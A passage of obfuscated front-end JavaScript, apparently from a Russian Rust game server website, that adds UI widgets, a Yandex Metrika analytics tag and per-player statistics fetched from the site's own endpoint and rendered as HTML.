        _0x514ac6['appendChild'](_0x46a356),
        _0x514ac6[_0x597aa5(0x219)](_0x2a8d1f),
        _0x5e12a5 === _0x4c521f['length'] - 0x1 ? (_0x98facb[_0x597aa5(0x1aa)] = '',
        _0x98facb[_0x597aa5(0x219)](_0x2a8d1f)) : _0x57f257[_0x597aa5(0x219)](_0x514ac6);
    }
    ),
    _0x57f257[_0xe54ff4(0x219)](_0x98facb),
    _0x3af127[_0xe54ff4(0x219)](_0x57f257);
}
function initApp() {
    const _0x1a58b6 = _0x31dfac;
    window['dispatchEvent'](new CustomEvent(_0x1a58b6(0x10a))),
    window[_0x1a58b6(0x1c8)](new CustomEvent(_0x1a58b6(0x234))),
    window['componentsManager'][_0x1a58b6(0x27e)]();
}
function balance() {
    const _0xf7a44f = _0x31dfac;
    initApp();
    const _0x445980 = document[_0xf7a44f(0x1d5)](_0xf7a44f(0x25a));
    !_0x445980 && window[_0xf7a44f(0x24f)]['addListener'](_0xf7a44f(0x12c), 'DID_MOUNT', () => {
        const _0x265380 = _0xf7a44f
          , _0x4cb2d6 = _0x265380(0x2c9)
          , _0x379bd7 = document[_0x265380(0x1d5)]('.PlayerBalanceModal-module__label');
        _0x379bd7[_0x265380(0x226)](_0x265380(0x2d0), _0x4cb2d6);
    }
    );
}
function sound() {
    const _0x1b267b = _0x31dfac;
    initApp(),
    window[_0x1b267b(0x24f)][_0x1b267b(0x282)](_0x1b267b(0x1b3), 'DID_MOUNT', () => {
        const _0x445207 = _0x1b267b;
        var _0x263ad7 = document[_0x445207(0x1fd)](_0x445207(0x120));
        _0x263ad7[_0x445207(0x1bf)](function(_0x5eecee) {
            const _0xa86d2 = _0x445207;
            _0x5eecee['addEventListener'](_0xa86d2(0x192), function() {
                const _0x481082 = _0xa86d2;
                try {
                    var _0x81eecc = new Audio(_0x481082(0x28d));
                    _0x81eecc[_0x481082(0x1a8)]();
                } catch (_0x18f2cf) {
                    console[_0x481082(0x18c)](_0x481082(0x17b), _0x18f2cf);
                }
            });
        });
    }
    );
}
function yandexMetrics() {
    const _0x469392 = _0x31dfac;
    initApp();
    var _0x3c3919 = document[_0x469392(0x183)] || document[_0x469392(0x2e3)](_0x469392(0x183))[0x0]
      , _0x168179 = document['createElement'](_0x469392(0x1ef));
    _0x168179[_0x469392(0x1aa)] = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20<!--\x20Yandex.Metrika\x20counter\x20-->\x0a\x20\x20\x20\x20\x20\x20\x20\x20<script\x20type=\x22text/javascript\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20(function(m,e,t,r,i,k,a){\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20m[i].l=1*new\x20Date();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20for(var\x20j=0;j<document.scripts.length;j++){\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(document.scripts[j].src===r){\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20(window,\x20document,\x20\x22script\x22,\x20\x22https://mc.yandex.ru/metrika/tag.js\x22,\x20\x22ym\x22);\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ym(96282848,\x20\x22init\x22,\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20clickmap:true,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20trackLinks:true,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20accurateTrackBounce:true,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20webvisor:true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<noscript>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://mc.yandex.ru/watch/96282848\x22\x20style=\x22position:absolute;\x20left:-9999px;\x22\x20alt=\x22\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</noscript>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<!--\x20/Yandex.Metrika\x20counter\x20-->\x0a\x20\x20\x20\x20',
    _0x3c3919['appendChild'](_0x168179);
}
function wipeblock() {
    const _0x127ad7 = _0x31dfac;
    initApp(),
    window[_0x127ad7(0x24f)][_0x127ad7(0x282)](_0x127ad7(0x1cd), 'DID_MOUNT', () => {
        const _0x26f51f = _0x127ad7;
        var _0x1eb9c3 = document['querySelector']('.PlayerBalance-module__wrapper');
        yandexMetrics();
        if (_0x1eb9c3) {
            var _0x2f460c = _0x26f51f(0x1e1);
            _0x1eb9c3['insertAdjacentHTML'](_0x26f51f(0x2d0), _0x2f460c);
        }
    }
    ),
    window[_0x127ad7(0x24f)]['load']();
}
function whenwipe() {
    const _0x5e8251 = _0x31dfac;
    try {
        window[_0x5e8251(0x1c8)](new CustomEvent(_0x5e8251(0x10a))),
        window[_0x5e8251(0x1c8)](new CustomEvent('initComponentsManager')),
        window['componentsManager'][_0x5e8251(0x282)](_0x5e8251(0x1f2), 'DID_UPDATE', () => {
            const _0x4f0de3 = _0x5e8251;
            fetchDataAndRender(),
            insertAllPlayersBeforeButton();
            const _0x5af33e = document[_0x4f0de3(0x1d5)](_0x4f0de3(0x24a));
            if (_0x5af33e) {
                const _0x49393a = document['createElement'](_0x4f0de3(0x1ef));
                _0x49393a[_0x4f0de3(0x217)] = 'boxHeader\x20monitoringWipe';
                const _0x109108 = document[_0x4f0de3(0x1a9)]('h2');
                _0x109108[_0x4f0de3(0x217)] = 'MonitoringWidget-module__header',
                _0x109108[_0x4f0de3(0x1b2)] = _0x4f0de3(0x1f1);
                const _0x51b382 = document[_0x4f0de3(0x1a9)](_0x4f0de3(0x2a2));
                _0x51b382[_0x4f0de3(0x1b2)] = _0x4f0de3(0x211),
                _0x51b382['onclick'] = () => {
                    const _0x12e803 = _0x4f0de3;
                    document[_0x12e803(0x1d5)](_0x12e803(0x212))[_0x12e803(0x174)][_0x12e803(0xf5)](_0x12e803(0x268));
                }
                ,
                _0x51b382[_0x4f0de3(0x174)][_0x4f0de3(0xf5)](_0x4f0de3(0x1c6)),
                _0x49393a['appendChild'](_0x109108),
                _0x49393a['appendChild'](_0x51b382),
                _0x5af33e[_0x4f0de3(0x2d3)][_0x4f0de3(0x260)](_0x49393a, _0x5af33e);
            } else {}
            setTimeout(function() {
                const _0x4e526c = _0x4f0de3;
                document[_0x4e526c(0x2dc)](_0x4e526c(0x1a3))[_0x4e526c(0x2ac)](_0x4e526c(0x201), function() {
                    const _0x53d3e4 = _0x4e526c;
                    document[_0x53d3e4(0x1d5)](_0x53d3e4(0x23d))[_0x53d3e4(0x174)][_0x53d3e4(0xf5)](_0x53d3e4(0x268));
                });
            }, 0x3e8);
            ;
        }
        ),
        window['componentsManager'][_0x5e8251(0x27e)]();
    } catch (_0x2e7b52) {
        console['error']('Произошла\x20ошибка:', _0x2e7b52);
    }
}
const serverToButtonMap = {
    'РОССИЙСКИЙ\x20x1\x20-\x20No\x20limit': _0x31dfac(0x182),
    'МОСКОВСКИЙ\x20-\x20MAX3': _0x31dfac(0x10e),
    'КЛАССИКА\x20x2\x20-\x20NoLimit': _0x31dfac(0x214),
    'КРАСНОДАРСКИЙ\x20-\x20MAX2': _0x31dfac(0x289),
    'КЛАССИКА\x20х3\x20-\x20MAX8': _0x31dfac(0x2dd),
    'РОССИЙСКИЙ\x20#2\x20-\x20Nolimit': _0x31dfac(0x1f3),
    'VANILLA\x202x2': _0x31dfac(0x1a5),
    'РОССИЙСКИЙ\x20x2\x20-\x20No\x20limit': _0x31dfac(0x1ac),
    'РОССИЙСКИЙ\x20x1': _0x31dfac(0x182),
    'МОСКОВСКИЙ\x20-\x20MAX3': _0x31dfac(0x10e),
    'КЛАССИКА\x20x2\x20-\x20NoLimit': _0x31dfac(0x214),
    'КРАСНОДАРСКИЙ\x20-\x20MAX2': 'krasnodar_stats',
    'КЛАССИКА\x20х3\x20-\x20MAX8': _0x31dfac(0x2dd),
    'РОССИЙСКИЙ\x20x2': _0x31dfac(0x1ac),
    'VANILLA\x202x2': _0x31dfac(0x1a5),
    'РОССИЙСКИЙ\x20x2\x20-\x20No\x20limit': _0x31dfac(0x1ac)
};
var currentStatsElement = null;
function statsProfile(_0x11f134) {
    const _0x57e244 = _0x31dfac;
    var _0x9fd21f = document[_0x57e244(0x1d5)](_0x57e244(0x180))
      , _0x1a5cfb = document[_0x57e244(0x1a9)](_0x57e244(0x1ef));
    _0x1a5cfb['innerHTML'] = '\x0a\x20\x20\x20\x20<div\x20class=\x22stats_button\x22>\x0a\x20\x20\x20\x20<button\x20id=\x22russian_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22' + _0x11f134 + _0x57e244(0x2cc) + _0x11f134 + _0x57e244(0x21f) + _0x11f134 + _0x57e244(0x1f9) + _0x11f134 + _0x57e244(0x101) + _0x11f134 + _0x57e244(0x22c) + _0x11f134 + _0x57e244(0x276),
    _0x9fd21f[_0x57e244(0x2d3)]['insertBefore'](_0x1a5cfb, _0x9fd21f['nextSibling']),
    getStatsInProfile();
}
function clickShowStats(_0x29e657) {
    const _0x15b93f = _0x31dfac
      , _0x2b115a = document['querySelectorAll'](_0x15b93f(0x161));
    _0x2b115a[_0x15b93f(0x1bf)](_0x3cd199 => {
        const _0xb94436 = _0x15b93f;
        _0x3cd199[_0xb94436(0x2ac)](_0xb94436(0x201), function() {
            const _0x405260 = _0xb94436
              , _0x3d86d8 = _0x3cd199[_0x405260(0x298)](_0x405260(0x203))
              , _0xcc2cd = getServerByButton(_0x3d86d8);
        });
    }
    ),
    clickButtonByServer(_0x29e657);
}
function getServerByButton(_0x34767a) {
    const _0x5be5a1 = _0x31dfac;
    return Object['keys'](serverToButtonMap)[_0x5be5a1(0x17c)](_0x397554 => serverToButtonMap[_0x397554] === _0x34767a);
}
function profileStats() {
    const _0x33ec43 = _0x31dfac;
    window[_0x33ec43(0x1c8)](new CustomEvent(_0x33ec43(0x10a))),
    window[_0x33ec43(0x1c8)](new CustomEvent(_0x33ec43(0x234))),
    window[_0x33ec43(0x24f)]['addListener'](_0x33ec43(0x11d), _0x33ec43(0x1e5), () => {
        const _0x17e9e5 = _0x33ec43
          , _0x4fc354 = window[_0x17e9e5(0xfd)]()
          , {player: _0x3b88b7} = _0x4fc354[_0x17e9e5(0x2c5)]
          , _0x206617 = _0x4fc354[_0x17e9e5(0x2d4)][_0x17e9e5(0x239)]
          , _0x5d8fdc = _0x4fc354[_0x17e9e5(0x1ee)][_0x17e9e5(0x17e)]['find'](_0x4d0bdd => _0x4d0bdd['id'] === _0x206617);
        statsProfile(_0x3b88b7[_0x17e9e5(0x2c0)]),
        console[_0x17e9e5(0x23e)](_0x5d8fdc[_0x17e9e5(0x2c6)]),
        clickShowStats(_0x5d8fdc[_0x17e9e5(0x2c6)]);
    }
    ),
    window[_0x33ec43(0x24f)][_0x33ec43(0x27e)]();
}
function clickButtonByServer(_0x487c41) {
    const _0x4ff48f = _0x31dfac
      , _0x5e2363 = serverToButtonMap[_0x487c41];
    if (_0x5e2363) {
        const _0x24be31 = document[_0x4ff48f(0x2dc)](_0x5e2363);
        _0x24be31 ? _0x24be31['click']() : console['error'](_0x4ff48f(0x28c) + _0x5e2363 + _0x4ff48f(0x1e2));
    }
}
async function getStatsInProfile() {
    const _0x60e8f9 = _0x31dfac;
    document['body']['addEventListener'](_0x60e8f9(0x201), async _0x201776 => {
        const _0x2d90c1 = _0x60e8f9
          , _0x59173a = _0x201776[_0x2d90c1(0x144)];
        _0x201776['stopPropagation']();
        _0x59173a[_0x2d90c1(0x126)] === 'BUTTON' && (document['querySelectorAll']('.statsBtnProfile')[_0x2d90c1(0x1bf)](_0x51d6af => {
            const _0x4b75b4 = _0x2d90c1;
            _0x51d6af[_0x4b75b4(0x174)][_0x4b75b4(0x244)](_0x4b75b4(0x268));
        }
        ),
        _0x59173a['classList']['add'](_0x2d90c1(0x268)));
        const _0x3e189a = _0x59173a[_0x2d90c1(0xfa)][_0x2d90c1(0x20b)];
        if (!_0x3e189a)
            return;
        const _0x2a9e96 = _0x59173a[_0x2d90c1(0xfa)][_0x2d90c1(0x1ed)]
          , _0x36285f = 'wipe'
          , _0x242cc7 = 'https://rustaria.ru/personalstats.php?steamid=' + _0x3e189a + '&table=' + _0x2a9e96 + _0x2d90c1(0x2c1) + _0x36285f;
        try {
            const _0x4d57b7 = await fetch(_0x242cc7);
            if (!_0x4d57b7['ok']) {
                console[_0x2d90c1(0x18c)]('Ошибка\x20при\x20запросе\x20данных:', _0x4d57b7[_0x2d90c1(0x109)], _0x4d57b7[_0x2d90c1(0x13d)]);
                return;
            }
            const _0x1605fe = await _0x4d57b7[_0x2d90c1(0x129)]();
            updateProfileStats(_0x1605fe);
        } catch (_0x2d81db) {
            console[_0x2d90c1(0x18c)](_0x2d90c1(0x130), _0x2d81db),
            updateProfileStatsError();
        }
    }
    );
}
function updateProfileStats(_0x3074e3) {
    const _0xe698e0 = _0x31dfac;
    currentStatsElement && currentStatsElement['remove']();
    var _0x2acb8c = document[_0xe698e0(0x1d5)]('.stats_button')
      , _0x1aa8c7 = document['createElement']('div');
    _0x1aa8c7[_0xe698e0(0x1aa)] = formatStatsData(_0x3074e3),
    _0x2acb8c['parentNode']['insertBefore'](_0x1aa8c7, _0x2acb8c[_0xe698e0(0x2ce)]),
    currentStatsElement = _0x1aa8c7;
}
function updateProfileStatsError() {
    const _0x244ee4 = _0x31dfac;
    currentStatsElement && currentStatsElement['remove']();
    var _0x54a306 = document[_0x244ee4(0x1d5)](_0x244ee4(0x1d4))
      , _0x314c4e = document[_0x244ee4(0x1a9)](_0x244ee4(0x1ef));
    _0x314c4e[_0x244ee4(0x1aa)] = '\x0a\x20\x20\x20\x20<div\x20class=\x22error-container\x22>\x09\x09\x0a\x20\x20\x20\x20<h1><svg\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20width=\x221em\x22\x20height=\x221em\x22\x20viewBox=\x220\x200\x201024\x201024\x22><path\x20fill=\x22#c79897\x22\x20d=\x22M512\x2064a448\x20448\x200\x201\x201\x200\x20896a448\x20448\x200\x200\x201\x200-896m0\x20192a58.432\x2058.432\x200\x200\x200-58.24\x2063.744l23.36\x20256.384a35.072\x2035.072\x200\x200\x200\x2069.76\x200l23.296-256.384A58.432\x2058.432\x200\x200\x200\x20512\x20256m0\x20512a51.2\x2051.2\x200\x201\x200\x200-102.4a51.2\x2051.2\x200\x200\x200\x200\x20102.4\x22/></svg>Профиль\x20не\x20найден!</h1>\x0a\x20\x20\x20\x20<p>Произошла\x20ошибка\x20при\x20получении\x20данных\x20на\x20данном\x20сервере.\x20Пожалуйста,\x20удостоверьтесь,\x20что\x20вы\x20играли\x20именно\x20на\x20нём.</p>\x20\x20\x20\x0a</div>\x0a\x20\x20\x20\x20',
    _0x54a306['parentNode'][_0x244ee4(0x278)](_0x314c4e, _0x54a306[_0x244ee4(0x2ce)]),
    currentStatsElement = _0x314c4e;
}
function formatStatsProfileData(_0x24e7a9) {
    const _0x2e230f = _0x31dfac
      , _0x56ba47 = _0x24e7a9[Object[_0x2e230f(0x184)](_0x24e7a9)[0x0]];
    if (Object[_0x2e230f(0x184)](_0x56ba47)['length'] > 0x0) {
        const _0x56fc80 = parseInt(_0x56ba47[_0x2e230f(0x1af)])
          , _0x154922 = formatTime(_0x56fc80);
        let _0x2c460d = _0x2e230f(0x1ea) + _0x56ba47[_0x2e230f(0x240)] + _0x2e230f(0x14a) + _0x56ba47[_0x2e230f(0x291)] + _0x2e230f(0x258) + _0x56ba47[_0x2e230f(0xf1)] + _0x2e230f(0x1bd) + _0x56ba47['Deers'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-horse\x20profile-icon\x22></i>Лошадей\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x22f)] + _0x2e230f(0x115) + _0x56ba47[_0x2e230f(0x275)] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-paw\x20profile-icon\x22></i>Медведей\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47['Bears'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-walkie-talkie\x20profile-icon\x22></i>Ученых</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47['Scientists'] + _0x2e230f(0x197) + _0x56ba47[_0x2e230f(0x248)] + _0x2e230f(0x150) + _0x56ba47[_0x2e230f(0x207)] + _0x2e230f(0x138) + _0x56ba47[_0x2e230f(0x19c)] + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20torso\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Тело</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>' + _0x56ba47['TorsoHits'] + _0x2e230f(0x26a) + _0x56ba47[_0x2e230f(0x2a8)] + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20rightarm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Правая\x20рука</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>' + _0x56ba47[_0x2e230f(0x1d1)] + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20leftleg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Левое\x20бедро</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>' + _0x56ba47[_0x2e230f(0x2b5)] + _0x2e230f(0x1d7) + _0x56ba47[_0x2e230f(0x2c7)] + _0x2e230f(0x236) + _0x56ba47['LeftFootHits'] + _0x2e230f(0x179) + _0x56ba47[_0x2e230f(0x147)] + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<section\x20data-v-22378e5b=\x22\x22\x20class=\x22stats\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22player-stats\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-header\x22>Статистика</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-globe\x20profile-icon\x22></i>Коннектов</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47['Connections'] + _0x2e230f(0x295) + _0x154922 + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b